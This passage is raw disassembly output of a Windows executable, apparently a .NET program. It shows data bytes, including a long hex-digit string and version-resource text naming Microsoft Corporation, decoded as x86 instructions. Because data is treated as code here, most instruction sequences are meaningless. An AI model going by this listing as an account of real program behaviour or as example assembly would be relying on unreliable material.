  403ba7:	xor    ah,BYTE PTR [ebp+0x31]
  403baa:	xor    BYTE PTR [ecx+0x66],ah
  403bad:	data16 xor BYTE PTR [ecx+0x66],ah
  403bb1:	xor    BYTE PTR [eax],bh
  403bb3:	xor    al,0x39
  403bb5:	xor    eax,0x62663430
  403bba:	aaa    
  403bbb:	arpl   WORD PTR [ebp+0x61],sp
  403bbe:	xor    esp,DWORD PTR [esi+0x66]
  403bc1:	xor    DWORD PTR [ecx],edi
  403bc3:	xor    ah,BYTE PTR [ebx+eiz*2+0x38]
  403bc7:	fs xor BYTE PTR gs:[ebp+0x64],ah
  403bcc:	popa   
  403bcd:	fs ss xor al,0x63
  403bd1:	cmp    BYTE PTR ss:[ebp+0x66],ah
  403bd5:	fs xor esi,DWORD PTR gs:[ebx+eiz*2]
  403bda:	xor    eax,0x30336436
  403bdf:	xor    ah,BYTE PTR [ecx+0x64]
  403be2:	xor    eax,0x36646635
  403be7:	cmp    BYTE PTR gs:[eax],dh
  403bea:	xor    si,WORD PTR [eax]
  403bed:	xor    ah,BYTE PTR [ebp+esi*1+0x65]
  403bf1:	data16 arpl WORD PTR [ebp+eiz*2+0x61],sp
  403bf6:	cmp    DWORD PTR gs:0x38353633,esi
  403bfd:	xor    esi,DWORD PTR fs:[esi*1+0x31363532]
  403c05:	bound  esi,QWORD PTR ds:0x63363366
  403c0b:	xor    eax,0x66653234
  403c10:	bound  esp,QWORD PTR fs:[esp+eiz*2+0x39]
  403c15:	data16 cmp BYTE PTR [eax],bh
  403c18:	cmp    BYTE PTR ds:0x33643833,dh
  403c1e:	aaa    
  403c1f:	xor    al,0x63
  403c21:	xor    WORD PTR gs:[eax],si
  403c25:	ss popa 
  403c27:	arpl   WORD PTR [esi+0x37],sp
  403c2a:	cmp    DWORD PTR fs:[ebx],esi
  403c2d:	popa   
  403c2e:	xor    al,0x34
  403c30:	xor    al,0x35
  403c32:	arpl   WORD PTR [ebx],si
  403c34:	arpl   WORD PTR [edi],si
  403c36:	xor    esp,DWORD PTR [ebx+0x64]
  403c39:	cmp    DWORD PTR [ecx],esi
  403c3b:	xor    DWORD PTR [esi+0x30],esp
  403c3e:	xor    eax,0x61613137
  403c43:	xor    sp,WORD PTR [ebp+esi*1+0x34]
  403c48:	fs popa 
  403c4a:	xor    DWORD PTR [edx],esi
  403c4c:	bound  esi,QWORD PTR [ecx]
  403c4e:	xor    DWORD PTR [esp+eiz*2+0x65],esp
  403c52:	arpl   WORD PTR [ebx],si
  403c54:	aaa    
  403c55:	xor    eax,0x813362
  403c5a:	popa   
  403c5b:	xor    eax,0x36363861
  403c60:	xor    DWORD PTR gs:[ebp+0x65],esp
  403c64:	xor    DWORD PTR [eax],edi
  403c66:	data16 cmp BYTE PTR ss:[eax],dh
  403c6a:	aaa    
  403c6b:	ss cmp BYTE PTR ss:[edx],dh
  403c6f:	xor    BYTE PTR [ecx],bh
  403c71:	xor    sp,WORD PTR [edx+0x31]
  403c75:	xor    DWORD PTR [edx],esi
  403c77:	xor    esi,DWORD PTR [esi]
  403c79:	popa   
  403c7a:	arpl   WORD PTR [ebp+0x35],sp
  403c7d:	xor    dh,BYTE PTR gs:[ecx]
  403c80:	xor    WORD PTR [ecx],si
  403c83:	aaa    
  403c84:	cmp    BYTE PTR [eax],dh
  403c86:	xor    esp,DWORD PTR [ecx+0x33]
  403c89:	xor    DWORD PTR [ebx+esi*1],esi
  403c8c:	popa   
  403c8d:	bound  esp,QWORD PTR [edx+0x31]
  403c90:	xor    dh,BYTE PTR [esi]
  403c92:	fs xor BYTE PTR fs:[ebx],dh
  403c96:	xor    eax,0x32643764
  403c9b:	data16 cmp BYTE PTR [edi],dh
  403c9e:	bound  esi,QWORD PTR ss:[esi]
  403ca1:	cmp    DWORD PTR [ebx],esi
  403ca3:	cmp    BYTE PTR [ecx+0x61],ah
  403ca6:	data16 xor ah,BYTE PTR [ebp+0x65]
  403caa:	xor    esi,DWORD PTR [ecx+esi*1]
  403cad:	xor    al,0x64
  403caf:	xor    eax,0x64303234
  403cb4:	aaa    
  403cb5:	xor    eax,0x31323633
  403cba:	xor    al,0x30
  403cbc:	xor    BYTE PTR [edx+eiz*2+0x34],ah
  403cc0:	xor    al,0x61
  403cc2:	xor    al,0x39
  403cc4:	arpl   WORD PTR [eax+edi*1],si
  403cc7:	arpl   WORD PTR ss:[ebp+0x31],sp
  403ccb:	xor    esi,DWORD PTR [ebx+esi*1]
  403cce:	xor    BYTE PTR [eax],dh
  403cd0:	popa   
  403cd1:	xor    dh,BYTE PTR [ecx]
  403cd3:	xor    BYTE PTR [esi],dh
  403cd5:	popa   
  403cd6:	bound  esi,QWORD PTR fs:[esi]
  403cd9:	bound  esp,QWORD PTR [edx+eiz*2+0x34]
  403cdd:	xor    esi,DWORD PTR [ebx]
  403cdf:	xor    eax,0x65663039
  403ce4:	data16 cmp BYTE PTR [ecx+0x64],ah
  403ce8:	xor    eax,0x63333463
  403ced:	bound  esp,QWORD PTR [ecx+0x38]
  403cf0:	xor    dh,BYTE PTR [edx]
  403cf2:	cmp    DWORD PTR [eax],esi
  403cf4:	arpl   WORD PTR fs:[ecx+edi*1],si
  403cf8:	xor    eax,0x66653033
  403cfd:	data16 cmp BYTE PTR fs:[esi],dh
  403d01:	xor    eax,0x39643332
  403d06:	xor    al,0x38
  403d08:	xor    esp,DWORD PTR [ebx+0x30]
  403d0b:	xor    BYTE PTR [esi+0x34],ah
  403d0e:	xor    eax,0x34666138
  403d13:	cmp    BYTE PTR ss:[ecx],bh
  403d16:	xor    BYTE PTR [eax],dh
  403d18:	xor    esi,DWORD PTR [esi]
  403d1a:	bound  esi,QWORD PTR [eax]
  403d1c:	xor    ah,BYTE PTR gs:[ebx+0x36]
  403d20:	xor    DWORD PTR [eax+esi*1+0x37],esp
  403d24:	aaa    
  403d25:	fs aaa 
  403d27:	bound  sp,DWORD PTR [ecx+0x63]
  403d2b:	xor    al,0x36
  403d2d:	aaa    
  403d2e:	popa   
  403d2f:	xor    eax,0x62653630
  403d34:	popa   
  403d35:	xor    bh,BYTE PTR [ecx]
  403d37:	gs xor al,0x36
  403d3a:	aaa    
  403d3b:	popa   
  403d3c:	cmp    BYTE PTR [edi],dh
  403d3e:	xor    DWORD PTR [ecx],edi
  403d40:	cmp    BYTE PTR [edx+0x30],ah
  403d43:	xor    eax,0x34376333
  403d48:	cmp    DWORD PTR [ecx+0x61],esp
  403d4b:	xor    ah,BYTE PTR [ecx+0x34]
  403d4e:	xor    bh,BYTE PTR fs:[eax]
  403d51:	xor    al,0x30
  403d53:	arpl   WORD PTR [edi],si
  403d55:	cmp    BYTE PTR [eiz*2+0x6436],dh
  403d5c:	push   ds
  403d5d:	add    DWORD PTR [eax],eax
  403d5f:	add    DWORD PTR [eax],eax
  403d61:	push   esp
  403d62:	add    dl,BYTE PTR [esi]
  403d64:	push   edi
  403d65:	jb     0x403dc8
  403d67:	jo     0x403db7
  403d69:	outs   dx,DWORD PTR ds:[esi]
  403d6a:	outs   dx,BYTE PTR ds:[esi]
  403d6b:	inc    ebp
  403d6c:	js     0x403dd1
  403d6e:	gs jo  0x403de5
  403d71:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  403d78:	ja     0x403ded
  403d7a:	add    DWORD PTR [eax],ecx
  403d7c:	add    DWORD PTR [eax],eax
  403d7e:	or     BYTE PTR [eax],al
	...
  403d88:	mov    edi,0x5011da
  403d8d:	add    BYTE PTR [eax],al
  403d8f:	add    BYTE PTR [edx],al
  403d91:	add    BYTE PTR [eax],al
  403d93:	add    BYTE PTR [ecx],ch
  403d95:	add    BYTE PTR [eax],al
  403d97:	add    BYTE PTR [eax-0x5fffffc3],ah
  403d9d:	pop    ds
  403d9e:	add    BYTE PTR [eax],al
  403da0:	push   edx
  403da1:	push   ebx
  403da2:	inc    esp
  403da3:	push   ebx
  403da4:	test   eax,0x63bd9790
  403da9:	push   esi
  403daa:	and    al,0x4c
  403dac:	scas   eax,DWORD PTR es:[edi]
  403dad:	iret   
  403dae:	sbb    bh,al
  403db0:	stos   BYTE PTR es:[edi],al
  403db1:	stc    
  403db2:	mov    ecx,gs
  403db4:	add    DWORD PTR [eax],eax
  403db6:	add    BYTE PTR [eax],al
  403db8:	push   esp
  403db9:	inc    esp
  403dba:	inc    ebp
  403dbb:	outs   dx,BYTE PTR ds:[esi]
  403dbc:	jbe    0x403e01
  403dbe:	ins    BYTE PTR es:[edi],dx
  403dbf:	gs popa 
  403dc1:	outs   dx,BYTE PTR ds:[esi]
  403dc2:	jne    0x403e34
  403dc4:	cs jo  0x403e2b
  403dc7:	bound  eax,QWORD PTR [eax]
	...
  403eb9:	add    BYTE PTR [eax],al
  403ebb:	add    ah,ah
  403ebd:	add    BYTE PTR ds:[eax],al
	...
  403ec8:	(bad)  
  403ec9:	add    BYTE PTR ds:[eax],al
  403ecc:	add    BYTE PTR [eax],ah
	...
  403ee2:	add    BYTE PTR [eax],al
  403ee4:	lock add BYTE PTR ds:[eax],al
	...
  403ef0:	add    BYTE PTR [eax],al
  403ef2:	pop    edi
  403ef3:	inc    ebx
  403ef4:	outs   dx,DWORD PTR ds:[esi]
  403ef5:	jb     0x403f3c
  403ef7:	js     0x403f5e
  403ef9:	dec    ebp
  403efa:	popa   
  403efb:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  403f02:	jb     0x403f69
  403f04:	gs cs fs ins BYTE PTR es:[edi],dx
  403f08:	ins    BYTE PTR es:[edi],dx
  403f09:	add    BYTE PTR [eax],al
  403f0b:	add    BYTE PTR [eax],al
  403f0d:	add    bh,bh
  403f0f:	and    eax,0x402000

Disassembly of section .rsrc:

00404000 <.rsrc>:
	...
  40400c:	add    BYTE PTR [eax],al
  40400e:	add    al,BYTE PTR [eax]
  404010:	adc    BYTE PTR [eax],al
  404012:	add    BYTE PTR [eax],al
  404014:	and    BYTE PTR [eax],al
  404016:	add    BYTE PTR [eax+0x18],al
  40401c:	cmp    BYTE PTR [eax],al
  40401e:	add    BYTE PTR [eax+0x0],al
	...
  40402c:	add    BYTE PTR [eax],al
  40402e:	add    DWORD PTR [eax],eax
  404030:	add    DWORD PTR [eax],eax
  404032:	add    BYTE PTR [eax],al
  404034:	push   eax
  404035:	add    BYTE PTR [eax],al
  404037:	add    BYTE PTR [eax],0x0
	...
  404046:	add    DWORD PTR [eax],eax
  404048:	add    DWORD PTR [eax],eax
  40404a:	add    BYTE PTR [eax],al
  40404c:	push   0x800000
	...
  40405d:	add    BYTE PTR [ecx],al
  40405f:	add    BYTE PTR [eax],al
  404061:	add    BYTE PTR [eax],al
  404063:	add    BYTE PTR [eax+0x0],al
	...
  404075:	add    BYTE PTR [ecx],al
  404077:	add    BYTE PTR [eax],al
  404079:	add    BYTE PTR [eax],al
  40407b:	add    BYTE PTR [eax-0x60000000],dl
  404081:	inc    eax
  404082:	add    BYTE PTR [eax],al
  404084:	fadd   DWORD PTR [ebx]
	...
  40408e:	add    BYTE PTR [eax],al
  404090:	js     0x4040d6
  404092:	add    BYTE PTR [eax],al
  404094:	jmp    0x0:0x1
  40409b:	add    BYTE PTR [eax],al
  40409d:	add    BYTE PTR [eax],al
  40409f:	add    al,bl
  4040a1:	add    esi,DWORD PTR [eax+eax*1]
  4040a4:	add    BYTE PTR [eax],al
  4040a6:	push   esi
  4040a7:	add    BYTE PTR [ebx+0x0],dl
  4040aa:	pop    edi
  4040ab:	add    BYTE PTR [esi+0x0],dl
  4040ae:	inc    ebp
  4040af:	add    BYTE PTR [edx+0x0],dl
  4040b2:	push   ebx
  4040b3:	add    BYTE PTR [ecx+0x0],cl
  4040b6:	dec    edi
  4040b7:	add    BYTE PTR [esi+0x0],cl
  4040ba:	pop    edi
  4040bb:	add    BYTE PTR [ecx+0x0],cl
  4040be:	dec    esi
  4040bf:	add    BYTE PTR [esi+0x0],al
  4040c2:	dec    edi
  4040c3:	add    BYTE PTR [eax],al
  4040c5:	add    BYTE PTR [eax],al
  4040c7:	add    BYTE PTR [ebp+0xfeef04],bh
  4040cd:	add    BYTE PTR [ecx],al
  4040cf:	add    BYTE PTR [eax],al
  4040d1:	add    BYTE PTR [ebx],cl
  4040d3:	add    BYTE PTR [ecx],al
  4040d5:	add    BYTE PTR [edi],ah
  4040d7:	mov    BYTE PTR [eax],0x0
  4040da:	or     eax,DWORD PTR [eax]
  4040dc:	add    DWORD PTR [eax],eax
  4040de:	daa    
  4040df:	(bad)  
  4040e0:	aas    
  4040e1:	add    BYTE PTR [eax],al
  4040e3:	add    BYTE PTR [eax],al
  4040e5:	add    BYTE PTR [eax],al
  4040e7:	add    BYTE PTR [eax+eax*1],al
  4040ea:	add    BYTE PTR [eax],al
  4040ec:	add    DWORD PTR [eax],eax
	...
  4040fa:	add    BYTE PTR [eax],al
  4040fc:	inc    esp
  4040fd:	add    BYTE PTR [eax],al
  4040ff:	add    BYTE PTR [ecx],al
  404101:	add    BYTE PTR [esi+0x0],dl
  404104:	popa   
  404105:	add    BYTE PTR [edx+0x0],dh
  404108:	inc    esi
  404109:	add    BYTE PTR [ecx+0x0],ch
  40410c:	ins    BYTE PTR es:[edi],dx
  40410d:	add    BYTE PTR [ebp+0x0],ah
  404110:	dec    ecx
  404111:	add    BYTE PTR [esi+0x0],ch
  404114:	data16 add BYTE PTR [edi+0x0],ch
  404118:	add    BYTE PTR [eax],al
  40411a:	add    BYTE PTR [eax],al
  40411c:	and    al,0x0
  40411e:	add    al,0x0
  404120:	add    BYTE PTR [eax],al
  404122:	push   esp
  404123:	add    BYTE PTR [edx+0x0],dh
  404126:	popa   
  404127:	add    BYTE PTR [esi+0x0],ch
  40412a:	jae    0x40412c
  40412c:	ins    BYTE PTR es:[edi],dx
  40412d:	add    BYTE PTR [ecx+0x0],ah
  404130:	je     0x404132
  404132:	imul   eax,DWORD PTR [eax],0x6e006f
  404138:	add    BYTE PTR [eax],al
  40413a:	add    BYTE PTR [eax],al
  40413c:	add    BYTE PTR [eax],al
  40413e:	mov    al,0x4
  404140:	cmp    BYTE PTR [ebx],al
  404142:	add    BYTE PTR [eax],al
  404144:	add    DWORD PTR [eax],eax
  404146:	push   ebx
  404147:	add    BYTE PTR [eax+eax*1+0x72],dh
  40414b:	add    BYTE PTR [ecx+0x0],ch
  40414e:	outs   dx,BYTE PTR ds:[esi]
  40414f:	add    BYTE PTR [edi+0x0],ah
  404152:	inc    esi
  404153:	add    BYTE PTR [ecx+0x0],ch
  404156:	ins    BYTE PTR es:[edi],dx
  404157:	add    BYTE PTR [ebp+0x0],ah
  40415a:	dec    ecx
  40415b:	add    BYTE PTR [esi+0x0],ch
  40415e:	data16 add BYTE PTR [edi+0x0],ch
  404162:	add    BYTE PTR [eax],al
  404164:	adc    al,0x3
  404166:	add    BYTE PTR [eax],al
  404168:	add    DWORD PTR [eax],eax
  40416a:	xor    BYTE PTR [eax],al
  40416c:	xor    BYTE PTR [eax],al
  40416e:	xor    BYTE PTR [eax],al
  404170:	xor    BYTE PTR [eax],al
  404172:	xor    BYTE PTR [eax],al
  404174:	xor    al,0x0
  404176:	bound  eax,QWORD PTR [eax]
  404178:	xor    BYTE PTR [eax],al
  40417a:	add    BYTE PTR [eax],al
  40417c:	cmp    al,0x0
  40417e:	adc    DWORD PTR [eax],eax
  404180:	add    DWORD PTR [eax],eax
  404182:	inc    ebx
  404183:	add    BYTE PTR [edi+0x0],ch
  404186:	ins    DWORD PTR es:[edi],dx
  404187:	add    BYTE PTR [ebp+0x0],ch
  40418a:	add    BYTE PTR gs:[esi+0x0],ch
  40418e:	je     0x404190
  404190:	jae    0x404192
  404192:	add    BYTE PTR [eax],al
  404194:	push   esp
  404195:	add    BYTE PTR [eax+eax*1+0x45],al
  404199:	add    BYTE PTR [esi+0x0],ch
  40419c:	jbe    0x40419e
  40419e:	inc    ebx
  40419f:	add    BYTE PTR [eax+eax*1+0x65],ch
  4041a3:	add    BYTE PTR [ecx+0x0],ah
  4041a6:	outs   dx,BYTE PTR ds:[esi]
  4041a7:	add    BYTE PTR [ebp+0x0],dh
  4041aa:	jo     0x4041ac
  4041ac:	add    BYTE PTR cs:[ebp+0x0],ah
  4041b0:	js     0x4041b2
  4041b2:	add    BYTE PTR gs:[eax],al
  4041b5:	add    BYTE PTR [eax],al
  4041b7:	add    BYTE PTR [eax+eax*1+0x16],cl
  4041bb:	add    BYTE PTR [ecx],al
  4041bd:	add    BYTE PTR [ebx+0x0],al
  4041c0:	outs   dx,DWORD PTR ds:[esi]
  4041c1:	add    BYTE PTR [ebp+0x0],ch
  4041c4:	jo     0x4041c6
  4041c6:	popa   
  4041c7:	add    BYTE PTR [esi+0x0],ch
  4041ca:	jns    0x4041cc
  4041cc:	dec    esi
  4041cd:	add    BYTE PTR [ecx+0x0],ah
  4041d0:	ins    DWORD PTR es:[edi],dx
  4041d1:	add    BYTE PTR [ebp+0x0],ah
  4041d4:	add    BYTE PTR [eax],al
  4041d6:	add    BYTE PTR [eax],al
  4041d8:	dec    ebp
  4041d9:	add    BYTE PTR [ecx+0x0],ch
  4041dc:	arpl   WORD PTR [eax],ax
  4041de:	jb     0x4041e0
  4041e0:	outs   dx,DWORD PTR ds:[esi]
  4041e1:	add    BYTE PTR [ebx+0x0],dh
  4041e4:	outs   dx,DWORD PTR ds:[esi]
  4041e5:	add    BYTE PTR [esi+0x0],ah
  4041e8:	je     0x4041ea
  4041ea:	and    BYTE PTR [eax],al
  4041ec:	inc    ebx
  4041ed:	add    BYTE PTR [edi+0x0],ch
  4041f0:	jb     0x4041f2
  4041f2:	jo     0x4041f4
  4041f4:	outs   dx,DWORD PTR ds:[esi]
  4041f5:	add    BYTE PTR [edx+0x0],dh
  4041f8:	popa   
  4041f9:	add    BYTE PTR [eax+eax*1+0x69],dh
  4041fd:	add    BYTE PTR [edi+0x0],ch
  404200:	outs   dx,BYTE PTR ds:[esi]
  404201:	add    BYTE PTR [eax],al
  404203:	add    BYTE PTR [eax+eax*1+0x11],cl
  404207:	add    BYTE PTR [ecx],al
  404209:	add    BYTE PTR [esi+0x0],al
  40420c:	imul   eax,DWORD PTR [eax],0x65006c
  404212:	inc    esp
  404213:	add    BYTE PTR [ebp+0x0],ah
  404216:	jae    0x404218
  404218:	arpl   WORD PTR [eax],ax
  40421a:	jb     0x40421c
  40421c:	imul   eax,DWORD PTR [eax],0x740070
  404222:	imul   eax,DWORD PTR [eax],0x6e006f
  404228:	add    BYTE PTR [eax],al
  40422a:	add    BYTE PTR [eax],al
  40422c:	push   esp
  40422d:	add    BYTE PTR [eax+eax*1+0x45],al
  404231:	add    BYTE PTR [esi+0x0],ch
  404234:	jbe    0x404236
  404236:	inc    ebx
  404237:	add    BYTE PTR [eax+eax*1+0x65],ch
  40423b:	add    BYTE PTR [ecx+0x0],ah
  40423e:	outs   dx,BYTE PTR ds:[esi]
  40423f:	add    BYTE PTR [ebp+0x0],dh
  404242:	jo     0x404244
  404244:	add    BYTE PTR cs:[ebp+0x0],ah
  404248:	js     0x40424a
  40424a:	add    BYTE PTR gs:[eax],al
  40424d:	add    BYTE PTR [eax],al
  40424f:	add    BYTE PTR [eax+eax*1],bh
  404252:	or     eax,0x46000100
  404257:	add    BYTE PTR [ecx+0x0],ch
  40425a:	ins    BYTE PTR es:[edi],dx
  40425b:	add    BYTE PTR [ebp+0x0],ah
  40425e:	push   esi
  40425f:	add    BYTE PTR [ebp+0x0],ah
  404262:	jb     0x404264
  404264:	jae    0x404266
  404266:	imul   eax,DWORD PTR [eax],0x6e006f
  40426c:	add    BYTE PTR [eax],al
  40426e:	add    BYTE PTR [eax],al
  404270:	xor    DWORD PTR [eax],eax
  404272:	xor    DWORD PTR [eax],eax
  404274:	add    BYTE PTR cs:[eax],dh
  404277:	add    BYTE PTR [esi],ch
  404279:	add    BYTE PTR ds:0x37003000,dh
  40427f:	add    BYTE PTR [edx],dh
  404281:	add    BYTE PTR [edi],dh
  404283:	add    BYTE PTR [esi],ch
  404285:	add    BYTE PTR [ecx],dh
  404287:	add    BYTE PTR [eax],al
  404289:	add    BYTE PTR [eax],al
  40428b:	add    BYTE PTR [eax+eax*1+0x11],al
  40428f:	add    BYTE PTR [ecx],al
  404291:	add    BYTE PTR [ecx+0x0],cl
  404294:	outs   dx,BYTE PTR ds:[esi]
  404295:	add    BYTE PTR [eax+eax*1+0x65],dh
  404299:	add    BYTE PTR [edx+0x0],dh
  40429c:	outs   dx,BYTE PTR ds:[esi]
  40429d:	add    BYTE PTR [ecx+0x0],ah
  4042a0:	ins    BYTE PTR es:[edi],dx
  4042a1:	add    BYTE PTR [esi+0x0],cl
  4042a4:	popa   
  4042a5:	add    BYTE PTR [ebp+0x0],ch
  4042a8:	add    BYTE PTR gs:[eax],al
  4042ab:	add    BYTE PTR [eax+eax*1+0x44],dl
  4042af:	add    BYTE PTR [ebp+0x0],al
  4042b2:	outs   dx,BYTE PTR ds:[esi]
  4042b3:	add    BYTE PTR [esi+0x0],dh
  4042b6:	inc    ebx
  4042b7:	add    BYTE PTR [eax+eax*1+0x65],ch
  4042bb:	add    BYTE PTR [ecx+0x0],ah
  4042be:	outs   dx,BYTE PTR ds:[esi]
  4042bf:	add    BYTE PTR [ebp+0x0],dh
  4042c2:	jo     0x4042c4
  4042c4:	add    BYTE PTR cs:[ebp+0x0],ah
  4042c8:	js     0x4042ca
  4042ca:	add    BYTE PTR gs:[eax],al
  4042cd:	add    BYTE PTR [eax],al
  4042cf:	add    BYTE PTR [eax+0x1002e00],al
  4042d5:	add    BYTE PTR [eax+eax*1+0x65],cl
  4042d9:	add    BYTE PTR [edi+0x0],ah
  4042dc:	popa   
  4042dd:	add    BYTE PTR [eax+eax*1+0x43],ch
  4042e1:	add    BYTE PTR [edi+0x0],ch
  4042e4:	jo     0x4042e6
  4042e6:	jns    0x4042e8
  4042e8:	jb     0x4042ea
  4042ea:	imul   eax,DWORD PTR [eax],0x680067
  4042f0:	je     0x4042f2
  4042f2:	add    BYTE PTR [eax],al
  4042f4:	test   eax,0x4d002000
  4042f9:	add    BYTE PTR [ecx+0x0],ch
  4042fc:	arpl   WORD PTR [eax],ax
  4042fe:	jb     0x404300
  404300:	outs   dx,DWORD PTR ds:[esi]
  404301:	add    BYTE PTR [ebx+0x0],dh
  404304:	outs   dx,DWORD PTR ds:[esi]
  404305:	add    BYTE PTR [esi+0x0],ah
  404308:	je     0x40430a
  40430a:	and    BYTE PTR [eax],al
  40430c:	inc    ebx
  40430d:	add    BYTE PTR [edi+0x0],ch
  404310:	jb     0x404312
  404312:	jo     0x404314
  404314:	outs   dx,DWORD PTR ds:[esi]
  404315:	add    BYTE PTR [edx+0x0],dh
  404318:	popa   
  404319:	add    BYTE PTR [eax+eax*1+0x69],dh
  40431d:	add    BYTE PTR [edi+0x0],ch
  404320:	outs   dx,BYTE PTR ds:[esi]
  404321:	add    BYTE PTR [esi],ch
  404323:	add    BYTE PTR [eax],ah
  404325:	add    BYTE PTR [ecx+0x0],al
  404328:	ins    BYTE PTR es:[edi],dx
  404329:	add    BYTE PTR [eax+eax*1+0x20],ch
  40432d:	add    BYTE PTR [edx+0x0],dh
  404330:	imul   eax,DWORD PTR [eax],0x680067
  404336:	je     0x404338
  404338:	jae    0x40433a
  40433a:	and    BYTE PTR [eax],al
  40433c:	jb     0x40433e
  40433e:	add    BYTE PTR gs:[ebx+0x0],dh
  404342:	add    BYTE PTR gs:[edx+0x0],dh
  404346:	jbe    0x404348
  404348:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  40434d:	add    BYTE PTR [eax],al
  40434f:	add    BYTE PTR [eax+eax*1+0x11],cl
  404353:	add    BYTE PTR [ecx],al
  404355:	add    BYTE PTR [edi+0x0],cl
  404358:	jb     0x40435a
  40435a:	imul   eax,DWORD PTR [eax],0x690067
  404360:	outs   dx,BYTE PTR ds:[esi]
  404361:	add    BYTE PTR [ecx+0x0],ah
  404364:	ins    BYTE PTR es:[edi],dx
  404365:	add    BYTE PTR [esi+0x0],al
  404368:	imul   eax,DWORD PTR [eax],0x65006c
  40436e:	outs   dx,BYTE PTR ds:[esi]
  40436f:	add    BYTE PTR [ecx+0x0],ah
  404372:	ins    DWORD PTR es:[edi],dx
  404373:	add    BYTE PTR [ebp+0x0],ah
  404376:	add    BYTE PTR [eax],al
  404378:	push   esp
  404379:	add    BYTE PTR [eax+eax*1+0x45],al
  40437d:	add    BYTE PTR [esi+0x0],ch
  404380:	jbe    0x404382
  404382:	inc    ebx
  404383:	add    BYTE PTR [eax+eax*1+0x65],ch
  404387:	add    BYTE PTR [ecx+0x0],ah
  40438a:	outs   dx,BYTE PTR ds:[esi]
  40438b:	add    BYTE PTR [ebp+0x0],dh
  40438e:	jo     0x404390
  404390:	add    BYTE PTR cs:[ebp+0x0],ah
  404394:	js     0x404396
  404396:	add    BYTE PTR gs:[eax],al
  404399:	add    BYTE PTR [eax],al
  40439b:	add    BYTE PTR [eax+0x0],ah
  40439e:	pop    ds
  40439f:	add    BYTE PTR [ecx],al
  4043a1:	add    BYTE PTR [eax+0x0],dl
  4043a4:	jb     0x4043a6
  4043a6:	outs   dx,DWORD PTR ds:[esi]
  4043a7:	add    BYTE PTR [eax+eax*1+0x75],ah
  4043ab:	add    BYTE PTR [ebx+0x0],ah
  4043ae:	je     0x4043b0
  4043b0:	dec    esi
  4043b1:	add    BYTE PTR [ecx+0x0],ah
  4043b4:	ins    DWORD PTR es:[edi],dx
  4043b5:	add    BYTE PTR [ebp+0x0],ah
  4043b8:	add    BYTE PTR [eax],al
  4043ba:	add    BYTE PTR [eax],al
  4043bc:	dec    ebp
  4043bd:	add    BYTE PTR [ecx+0x0],ch
  4043c0:	arpl   WORD PTR [eax],ax
  4043c2:	jb     0x4043c4
  4043c4:	outs   dx,DWORD PTR ds:[esi]
  4043c5:	add    BYTE PTR [ebx+0x0],dh
  4043c8:	outs   dx,DWORD PTR ds:[esi]
  4043c9:	add    BYTE PTR [esi+0x0],ah
  4043cc:	je     0x4043ce
  4043ce:	scas   al,BYTE PTR es:[edi]
  4043cf:	add    BYTE PTR [eax],ah
  4043d1:	add    BYTE PTR [esi+0x0],dl
  4043d4:	imul   eax,DWORD PTR [eax],0x750073
  4043da:	popa   
  4043db:	add    BYTE PTR [eax+eax*1+0x20],ch
  4043df:	add    BYTE PTR [ebx+0x0],dl
  4043e2:	je     0x4043e4
  4043e4:	jne    0x4043e6
  4043e6:	add    BYTE PTR fs:[ecx+0x0],ch
  4043ea:	outs   dx,DWORD PTR ds:[esi]
  4043eb:	add    BYTE PTR [esi+0x32002000],ch
  4043f1:	add    BYTE PTR [eax],dh
  4043f3:	add    BYTE PTR [ecx],dh
  4043f5:	add    BYTE PTR [edx],dh
  4043f7:	add    BYTE PTR [eax],al
  4043f9:	add    BYTE PTR [eax],al
  4043fb:	add    BYTE PTR [eax+0x0],al
  4043fe:	or     eax,0x50000100
  404403:	add    BYTE PTR [edx+0x0],dh
  404406:	outs   dx,DWORD PTR ds:[esi]
  404407:	add    BYTE PTR [eax+eax*1+0x75],ah
  40440b:	add    BYTE PTR [ebx+0x0],ah
  40440e:	je     0x404410
  404410:	push   esi
  404411:	add    BYTE PTR [ebp+0x0],ah
  404414:	jb     0x404416
  404416:	jae    0x404418
  404418:	imul   eax,DWORD PTR [eax],0x6e006f
  40441e:	add    BYTE PTR [eax],al
  404420:	xor    DWORD PTR [eax],eax
  404422:	xor    DWORD PTR [eax],eax
  404424:	add    BYTE PTR cs:[eax],dh
  404427:	add    BYTE PTR [esi],ch
  404429:	add    BYTE PTR ds:0x37003000,dh
  40442f:	add    BYTE PTR [edx],dh
  404431:	add    BYTE PTR [edi],dh
  404433:	add    BYTE PTR [esi],ch
  404435:	add    BYTE PTR [ecx],dh
  404437:	add    BYTE PTR [eax],al
  404439:	add    BYTE PTR [eax],al
  40443b:	add    BYTE PTR [eax+eax*1],bh
  40443e:	or     DWORD PTR [eax],eax
  404440:	add    DWORD PTR [eax],eax
  404442:	inc    ecx
  404443:	add    BYTE PTR [ebx+0x0],dh
  404446:	jae    0x404448
  404448:	add    BYTE PTR gs:[ebp+0x0],ch
  40444c:	bound  eax,QWORD PTR [eax]
  40444e:	ins    BYTE PTR es:[edi],dx
  40444f:	add    BYTE PTR [ecx+0x0],bh
  404452:	and    BYTE PTR [eax],al
  404454:	push   esi
  404455:	add    BYTE PTR [ebp+0x0],ah
  404458:	jb     0x40445a
  40445a:	jae    0x40445c
  40445c:	imul   eax,DWORD PTR [eax],0x6e006f
  404462:	add    BYTE PTR [eax],al
  404464:	xor    DWORD PTR [eax],eax
  404466:	xor    DWORD PTR [eax],eax
  404468:	add    BYTE PTR cs:[eax],dh
  40446b:	add    BYTE PTR [esi],ch
  40446d:	add    BYTE PTR [eax],dh
  40446f:	add    BYTE PTR [esi],ch
  404471:	add    BYTE PTR [eax],dh
  404473:	add    BYTE PTR [eax],al
  404475:	add    BYTE PTR [eax],al
  404477:	add    bh,ch
  404479:	mov    ebx,0x783f3cbf
  40447e:	ins    DWORD PTR es:[edi],dx
  40447f:	ins    BYTE PTR es:[edi],dx
  404480:	and    BYTE PTR [esi+0x65],dh
  404483:	jb     0x4044f8
  404485:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  40448c:	xor    BYTE PTR [edx],ah
  40448e:	and    BYTE PTR [ebp+0x6e],ah
  404491:	arpl   WORD PTR [edi+0x64],bp
  404494:	imul   ebp,DWORD PTR [esi+0x67],0x5455223d
  40449b:	inc    esi
  40449c:	sub    eax,0x73202238
  4044a1:	je     0x404504
  4044a3:	outs   dx,BYTE PTR ds:[esi]
  4044a4:	fs popa 
  4044a6:	ins    BYTE PTR es:[edi],dx
  4044a7:	outs   dx,DWORD PTR ds:[esi]
